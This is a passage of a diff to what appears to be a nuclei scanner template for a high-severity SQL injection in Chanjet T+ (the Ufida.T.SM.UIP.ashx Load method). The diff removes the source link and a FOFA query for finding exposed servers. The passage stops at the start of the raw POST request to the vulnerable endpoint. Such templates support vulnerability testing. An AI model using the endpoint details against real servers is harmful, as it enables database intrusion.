@@ -3,12 +3,8 @@ info:
   name: 畅捷通T+ Load-Ufida.T.SM.UIP.ashx存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pzy2wfedfq66u4t4'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pzy2wfedfq66u4t4
-    fofa: app="畅捷通-TPlus"
 http:
 - raw:
   - 'POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanySettingController,Ufida.T.SM.UIP.ashx?method=Load HTTP/1.1
